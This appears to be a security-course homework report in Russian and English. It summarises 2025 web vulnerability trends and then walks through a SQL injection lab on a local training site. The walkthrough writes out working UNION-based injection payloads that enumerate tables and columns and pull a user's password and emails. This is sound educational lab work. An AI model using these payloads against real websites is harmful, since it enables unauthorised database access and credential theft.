3. Анти малваре:

Основной смысл атак на веб - не навредить оборудованию, а подшатнуть бизнес (падает выручка). Веб-приложения и API стали основной точкой давления из-за их доступности и высокой автоматизации атак.
Основные уязвимости:

  • Самой заметной уязвимостью 2025 года стала React2Shell (CVE-2025-55182).
  • Также самыми популярными стали:
    • CWE-79 — некорректная нейтрализация ввода во время генерации веб-страницы (XSS, межсайтовый скриптинг).
    • CWE-89 — SQL-инъекция, которая даёт прямой доступ к данным и бизнес-логике.
    • CWE-352 — подделка межсайтовых запросов (CSRF), которая позволяет выполнять действия от имени пользователя.

Тренды:

  • Появление атак, выполненных практически полностью с помощью нейросетей (искусственного интеллекта), почти без участия человека. С помощью ИИ злоумышленники ускорили поиск уязвимостей, анализ патчей и разработку эксплойтов. Время между публикацией CVE и эксплуатацией сократилось до часов. Это требует моментальной реакции и, в свою очередь, повысило ценность защитных решений с ML и AI, которые позволяют находить аномалии и блокировать даже эксплуатацию 0-day уязвимостей.

4. Deepstrike:

In H1 2025, the top five weakness types by CWE classification were:

  • Cross Site Scripting (XSS): Still the #1 most frequent vulnerability pattern in CVEs. XSS issues (CWE-79) appeared more than any other, enabling attackers to inject malicious scripts into web pages.
  • SQL Injection (SQLi): A close second. Injection flaws involving SQL (CWE-89) remained widespread, allowing attackers to manipulate databases through insecure queries.
  • Cross Site Request Forgery (CSRF): Another common bug (CWE-352), where attackers trick users' browsers into unwittingly executing unwanted actions on a site where they’re authenticated.
  • Other Injection Flaws: Includes things like OS command injection or code injection grouped under CWE-74.
  • Missing Authorization: Weak access control (CWE-862) rounds out the top 5, meaning many CVEs involve cases where critical functions lacked proper permission checks.

5. CyberSecurityNews:

За 4 года приоритеты немного поменялись (выросла важность misconfiguration и supply chain, инъекции ушли с 3-го места на 5-е), но сломанный контроль доступа и проблемы конфигурации остаются самыми опасными.

Выводы по источникам:

  • Успешные атаки на организации через эксплуатацию веб‑уязвимостей составляют единицы процентов от всего массива кибератак, но уже десятки процентов среди инцидентов с реальным бизнес‑ущербом (простой сервисов, потеря выручки, утечки данных), так как веб‑приложения и API являются основной точкой давления на бизнес‑сервисы.
  • Внутри самих веб‑инцидентов распределение по уязвимостям выглядит так: наибольший вклад дают XSS (CWE‑79) и SQL‑инъекции (CWE‑89), далее идут CSRF (CWE‑352) и прочие инъекции/десериализация (CWE‑74 и родственные), а также ошибки авторизации и сломанный контроль доступа (CWE‑862 и OWASP A01), которые по совокупному риску выходят в топ, даже если количественно встречаются реже, чем XSS.

Часть 2

Зашел на localhost, настроил базу, открылась страница - http://localhost:8080/task/, где надо ввести id.

Попробовал разные запросы вида http://localhost:8080/task/?id=n.

Нашёл Vinni-pukh - его id=4 и Volk2 - id=9.

Есть предположение, что id просто подставляется в SQL запрос. Попробуем разные инъекции:

http://localhost:8080/task/?id=1'
Получаем ошибку: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
Это значит запрос имеет вид SELECT * FROM table where id = ' id с сайта' LIMIT 0,1;

Попробуем выбрать все поля при помощи инъекции 1' OR '1'='1' -- -: http://localhost:8080/task/?id=1' OR '1'='1' -- -
Однако получаем только 1 запись — скорее всего скрипт подставляет первое значение в HTML.

Попробую сделать инъекцию через UNION: Сначала нужно определить количество столбцов, используя: http://localhost:8080/task/?id=-1' UNION SELECT 1,2,... -- -
Подбираем количество столбцов (в нашем случае 3). (-1 используется для того, чтобы WHERE id='id с сайта' вернул пустоту, и значения заполнились с UNION).

Теперь, когда у нас есть UNION, получим структуру БД с помощью запроса: http://localhost:8080/task/?id=-1' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database() -- -
GROUP_CONCAT(table_name) — склеиваем название таблиц, information_schema.tables — получаем информацию для конкретной БД.
Ответ:
Ваш id:1
Ваш логин:emails,users
Получаем две таблицы — Users и Emails.

Узнаем структуру таблиц: http://localhost:8080/task/?id=-1' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='users' -- -
Ответ:
Ваш id:1
Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password

Зная, что id пользователя Volk2=9, получим его пароль через запрос: http://localhost:8080/task/?id=-1' UNION SELECT username, password, 3 FROM users WHERE id=9 -- -
Ответ:
Ваш id:Volk2
Ваш логин:Wa spoiuuuuu - пароль

Теперь узнаем почту Vinni-pukh (id=4): Сначала получим структуру таблицы emails: http://localhost:8080/task/?id=-1' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='emails' -- -
Ответ:
Ваш id:1
Ваш логин:id,email_id

Получаем значения: http://localhost:8080/task/?id=-1' UNION SELECT id, email_id, 3 FROM emails -- -
Ответ:
Ваш id:1
Ваш логин:admin@otus-lab.com

Для Вини пуха: http://localhost:8080/task/?id=-1' UNION SELECT id, email_id, 3 FROM emails WHERE id=4 -- -
Ответ:
Ваш id:4
Ваш логин:honey_lover@otus-lab.com — email Вини пуха.
